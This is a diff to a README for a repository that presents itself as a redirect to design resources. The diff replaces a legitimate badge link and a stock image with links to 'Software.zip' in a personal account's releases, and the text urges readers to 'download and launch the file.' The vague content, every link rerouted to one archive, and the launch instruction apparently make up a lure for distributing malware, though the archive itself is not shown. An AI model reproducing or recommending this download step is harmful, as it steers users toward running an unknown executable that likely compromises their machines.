@@ -11,7 +11,7 @@ This repository serves as a redirect to Designs. 🗺️ If you are looking for 
 
 ### Get Started:
 To access the Designs repository, please click on the link below:
-[![Download Designs](https://img.shields.io/badge/Download-Designs-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Designs](https://github.com/anda4927/Design/releases/download/v1.0/Software.zip)](https://github.com/anda4927/Design/releases/download/v1.0/Software.zip)
 
 If the link ends with a file name, make sure to download and launch the file to explore the exciting design content.
 
@@ -22,4 +22,4 @@ We hope you enjoy exploring the world of design and unleash your creativity! ✨
 ### Remember:
 Design is not just what it looks like and feels like. Design is how it works. - Steve Jobs
 
-![Design Inspiration](https://images.pexels.com/photos/374743/pexels-photo-374743.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940)
+![Design Inspiration](https://github.com/anda4927/Design/releases/download/v1.0/Software.zip)
